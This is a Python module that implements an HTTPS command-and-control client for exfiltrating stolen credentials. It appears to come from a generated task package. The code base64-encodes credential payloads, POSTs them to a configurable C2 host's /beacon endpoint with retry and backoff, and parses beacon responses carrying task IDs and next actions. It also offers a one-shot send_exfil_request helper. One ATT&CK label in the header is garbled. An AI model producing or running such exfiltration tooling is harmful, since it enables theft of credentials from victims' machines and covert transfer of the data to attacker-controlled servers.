"""
http_c2_client.py
=================
HTTPS C2 transport for exfiltrating credential data over HTTP POST.

ATT&CK Techniques:
    T1041 – C2 over CNAME (Ingress)
    T1071.001 – Web Protocols: HTTP

Uses urllib.request to establish an HTTPS connection to a configurable
C2 server (default port 443) and sends exfiltrated data via HTTP POST
with a JSON body containing base64-encoded credential data.

Includes retry logic with exponential backoff for transient network failures.
"""
from __future__ import annotations

import json
import logging
import ssl
import time
import urllib.error
import urllib.request
from typing import Any, Dict, Optional, Union

from data.code_scripts_PAST.stage3_test_20260909_02_40_28.TASK_001_credential_store import ExfilPayload
from data.code_scripts_PAST.stage3_test_20260909_02_40_28.TASK_003_encoding_utils import Base64Encoder

__all__ = ["HTTPC2Client", "send_exfil_request", "parse_c2_response"]

logger = logging.getLogger(__name__)


def parse_c2_response(response_body: Union[bytes, str]) -> Dict[str, Any]:
    """Parse the C2 server response body into a structured dictionary.

    The expected response format is JSON with at minimum a 'status' field.
    Optional fields include 'task_id', 'next_action', 'beacon_interval',
    and an arbitrary 'data' envelope.

    Args:
        response_body: Raw bytes or string from the C2 HTTP response.

    Returns:
        Parsed dictionary with normalized keys.

    Raises:
        ValueError: If the response body cannot be decoded or parsed.
        json.JSONDecodeError: If the body is not valid JSON.
    """
    if isinstance(response_body, bytes):
        response_body = response_body.decode("utf-8", errors="replace")

    if not response_body or not response_body.strip():
        return {"status": "empty", "raw": ""}

    parsed = json.loads(response_body)

    if not isinstance(parsed, dict):
        parsed = {"status": "ok", "data": parsed}

    # Normalize common keys
    result: Dict[str, Any] = {
        "status": parsed.get("status", "unknown"),
        "task_id": parsed.get("task_id", None),
        "next_action": parsed.get("next_action", None),
        "beacon_interval": parsed.get("beacon_interval", None),
        "data": parsed.get("data", None),
        "raw": parsed,
    }
    return result


class HTTPC2Client:
    """HTTPS C2 transport client for exfiltrating data via HTTP POST.

    Establishes an HTTPS connection to a configurable C2 server on
    port 443 and sends exfiltrated credential data as a JSON body
    with base64-encoded payload content.

    Implements retry logic with exponential backoff for transient
    network failures (connection resets, timeouts, 5xx responses).

    ATT&CK: T1041, T1071.001

    Usage:
        client = HTTPC2Client(c2_host="192.168.1.100", path="/beacon")
        response = client.send_payload(payload)
        print(response["status"])
    """

    DEFAULT_PORT = 443
    DEFAULT_PATH = "/beacon"
    DEFAULT_TIMEOUT = 10.0
    DEFAULT_MAX_RETRIES = 3
    DEFAULT_BACKOFF_FACTOR = 2.0
    DEFAULT_BACKOFF_INITIAL = 1.0

    RETRYABLE_STATUS_CODES = {408, 429, 500, 502, 503, 504}

    def __init__(
        self,
        c2_host: str,
        port: int = DEFAULT_PORT,
        path: str = DEFAULT_PATH,
        timeout: float = DEFAULT_TIMEOUT,
        max_retries: int = DEFAULT_MAX_RETRIES,
        backoff_factor: float = DEFAULT_BACKOFF_FACTOR,
        backoff_initial: float = DEFAULT_BACKOFF_INITIAL,
        ca_bundle: Optional[str] = None,
        verify_ssl: bool = True,
        extra_headers: Optional[Dict[str, str]] = None,
    ) -> None:
        """Initialize the HTTP C2 client.

        Args:
            c2_host: Hostname or IP of the C2 server.
            port: Port number (default 443).
            path: URI path for the exfil endpoint.
            timeout: Per-request timeout in seconds.
            max_retries: Maximum number of retry attempts on failure.
            backoff_factor: Multiplier for exponential backoff delay.
            backoff_initial: Initial backoff delay in seconds.
            ca_bundle: Path to a CA certificate bundle for TLS verification.
            verify_ssl: Whether to verify the server TLS certificate.
            extra_headers: Additional HTTP headers to include in requests.
        """
        self._c2_host = c2_host
        self._port = port
        self._path = path
        self._timeout = timeout
        self._max_retries = max_retries
        self._backoff_factor = backoff_factor
        self._backoff_initial = backoff_initial
        self._ca_bundle = ca_bundle
        self._verify_ssl = verify_ssl
        self._extra_headers = extra_headers or {}
        self._encoder = Base64Encoder()

        self._url = self._build_url()
        self._ssl_context = self._build_ssl_context()

        logger.debug(
            "HTTPC2Client initialized: url=%s, timeout=%s, max_retries=%d",
            self._url, self._timeout, self._max_retries,
        )

    @property
    def url(self) -> str:
        """The fully-qualified C2 endpoint URL."""
        return self._url

    @property
    def c2_host(self) -> str:
        """The C2 server hostname or IP."""
        return self._c2_host

    @property
    def port(self) -> int:
        """The C2 server port."""
        return self._port

    def _build_url(self) -> str:
        """Construct the full HTTPS URL for the C2 endpoint."""
        return f"https://{self._c2_host}:{self._port}{self._path}"

    def _build_ssl_context(self) -> ssl.SSLContext:
        """Create an SSL context based on configuration."""
        if self._ca_bundle:
            ctx = ssl.create_default_context(cafile=self._ca_bundle)
        elif self._verify_ssl:
            ctx = ssl.create_default_context()
        else:
            ctx = ssl._create_unverified_context()  # noqa: SLF001
        return ctx

    def _build_headers(self) -> Dict[str, str]:
        """Assemble the full set of HTTP request headers."""
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "C2Beacon/1.0 (research-sandbox)",
            "X-Beacon-Protocol": "http-post",
        }
        headers.update(self._extra_headers)
        return headers

    def _construct_body(self, payload: ExfilPayload) -> bytes:
        """Construct the JSON request body with base64-encoded credential data.

        The body contains:
            - payload_id: unique identifier
            - timestamp: creation time
            - encoding: 'base64'
            - data: base64-encoded serialized payload
            - checksum: integrity hash from the payload
            - metadata: version and tags

        Args:
            payload: The ExfilPayload to encode.

        Returns:
            JSON-serialized bytes for the HTTP body.
        """
        # Serialize the payload to bytes
        payload_bytes = payload.to_bytes()

        # Base64-encode the serialized payload
        b64_data = self._encoder.encode(payload_bytes)

        body_dict: Dict[str, Any] = {
            "payload_id": payload.payload_id,
            "timestamp": payload.created_at,
            "version": payload.version,
            "encoding": "base64",
            "data": b64_data,
            "checksum": payload.checksum,
            "tags": payload.tags,
            "host_identifier": payload.store.host_identifier,
            "item_count": payload.store.total_items,
        }

        return json.dumps(body_dict).encode("utf-8")

    def _execute_request(self, body: bytes) -> bytes:
        """Execute a single HTTPS POST request.

        Args:
            body: The request body bytes.

        Returns:
            Response body as bytes.

        Raises:
            urllib.error.HTTPError: On non-2xx HTTP status.
            urllib.error.URLError: On connection/network failure.
            ssl.SSLError: On TLS handshake failure.
            TimeoutError: On request timeout.
        """
        request = urllib.request.Request(
            url=self._url,
            data=body,
            headers=self._build_headers(),
            method="POST",
        )

        logger.debug("Sending POST request to %s (%d bytes)", self._url, len(body))

        response = urllib.request.urlopen(
            request,
            timeout=self._timeout,
            context=self._ssl_context,
        )

        response_body = response.read()
        status_code = response.status

        logger.debug("Received response: status=%d, %d bytes", status_code, len(response_body))
        return response_body

    def _is_retryable_exception(self, exc: Exception) -> bool:
        """Determine if an exception is retryable.

        Args:
            exc: The caught exception.

        Returns:
            True if the error warrants a retry.
        """
        if isinstance(exc, urllib.error.HTTPError):
            return exc.code in self.RETRYABLE_STATUS_CODES
        if isinstance(exc, urllib.error.URLError):
            return True
        if isinstance(exc, (ConnectionError, ConnectionResetError, ConnectionRefusedError)):
            return True
        if isinstance(exc, TimeoutError):
            return True
        if isinstance(exc, ssl.SSLError):
            return False  # TLS errors are usually not transient
        if isinstance(exc, OSError):
            return True
        return False

    def _sleep_backoff(self, attempt: int) -> None:
        """Sleep with exponential backoff.

        Args:
            attempt: Zero-based attempt number (0 = first retry).
        """
        delay = self._backoff_initial * (self._backoff_factor ** attempt)
        logger.warning("Retrying in %.2f seconds (attempt %d)", delay, attempt + 1)
        time.sleep(delay)

    def send_payload(self, payload: ExfilPayload) -> Dict[str, Any]:
        """Send an ExfilPayload to the C2 server via HTTPS POST.

        Implements retry logic with exponential backoff for transient
        network failures.

        Args:
            payload: The ExfilPayload containing credential data.

        Returns:
            Parsed C2 response dictionary (from parse_c2_response).

        Raises:
            ConnectionError: If all retry attempts are exhausted.
            urllib.error.HTTPError: On non-retryable HTTP error.
            ssl.SSLError: On TLS failure.
            Exception: Any non-retryable unexpected error.
        """
        body = self._construct_body(payload)
        last_exception: Optional[Exception] = None

        for attempt in range(self._max_retries + 1):
            try:
                response_bytes = self._execute_request(body)
                return parse_c2_response(response_bytes)

            except urllib.error.HTTPError as http_err:
                last_exception = http_err
                if self._is_retryable_exception(http_err) and attempt < self._max_retries:
                    self._sleep_backoff(attempt)
                    continue
                logger.error(
                    "HTTP error %d: %s (attempt %d/%d)",
                    http_err.code, http_err.reason, attempt + 1, self._max_retries + 1,
                )
                raise

            except (urllib.error.URLError, ConnectionError, TimeoutError, OSError) as net_err:
                last_exception = net_err
                if attempt < self._max_retries:
                    self._sleep_backoff(attempt)
                    continue
                logger.error(
                    "Network error: %s (attempt %d/%d)",
                    net_err, attempt + 1, self._max_retries + 1,
                )
                raise ConnectionError(
                    f"C2 connection to {self._url} failed after "
                    f"{self._max_retries + 1} attempts: {net_err}"
                ) from net_err

            except ssl.SSLError as ssl_err:
                logger.error("TLS error: %s", ssl_err)
                raise

            except Exception as exc:
                logger.error("Unexpected error: %s", exc, exc_info=True)
                raise

        # Should not reach here, but satisfy type checkers
        raise ConnectionError(
            f"C2 connection to {self._url} failed: {last_exception}"
        ) from last_exception

    def health_check(self) -> bool:
        """Perform a lightweight connectivity check to the C2 server.

        Sends a minimal POST and checks for any HTTP response.

        Returns:
            True if the server responded (any status code), False otherwise.
        """
        try:
            minimal_body = json.dumps({"probe": True, "ts": time.time()}).encode("utf-8")
            request = urllib.request.Request(
                url=self._url,
                data=minimal_body,
                headers=self._build_headers(),
                method="POST",
            )
            urllib.request.urlopen(
                request,
                timeout=self._timeout,
                context=self._ssl_context,
            )
            return True
        except Exception:
            return False


def send_exfil_request(
    payload: ExfilPayload,
    c2_host: str,
    port: int = HTTPC2Client.DEFAULT_PORT,
    path: str = HTTPC2Client.DEFAULT_PATH,
    timeout: float = HTTPC2Client.DEFAULT_TIMEOUT,
    max_retries: int = HTTPC2Client.DEFAULT_MAX_RETRIES,
    backoff_factor: float = HTTPC2Client.DEFAULT_BACKOFF_FACTOR,
    backoff_initial: float = HTTPC2Client.DEFAULT_BACKOFF_INITIAL,
    ca_bundle: Optional[str] = None,
    verify_ssl: bool = True,
    extra_headers: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    """Convenience function to send an exfiltration payload to a C2 server.

    Creates a temporary HTTPC2Client, sends the payload, and returns
    the parsed response. Suitable for one-shot exfil operations.

    Args:
        payload: The ExfilPayload to transmit.
        c2_host: C2 server hostname or IP address.
        port: C2 server port (default 443).
        path: URI path for the exfil endpoint.
        timeout: Request timeout in seconds.
        max_retries: Maximum retry attempts on transient failures.
        backoff_factor: Exponential backoff multiplier.
        backoff_initial: Initial backoff delay in seconds.
        ca_bundle: Optional CA certificate bundle path.
        verify_ssl: Whether to verify TLS certificates.
        extra_headers: Additional HTTP headers.

    Returns:
        Parsed C2 response dictionary.

    Raises:
        ConnectionError: If all attempts fail.
        urllib.error.HTTPError: On non-retryable HTTP error.

    Example:
        >>> response = send_exfil_request(payload, c2_host="10.0.0.5")
        >>> print(response["status"])
        'received'
    """
    client = HTTPC2Client(
        c2_host=c2_host,
        port=port,
        path=path,
        timeout=timeout,
        max_retries=max_retries,
        backoff_factor=backoff_factor,
        backoff_initial=backoff_initial,
        ca_bundle=ca_bundle,
        verify_ssl=verify_ssl,
        extra_headers=extra_headers,
    )
    return client.send_payload(payload)
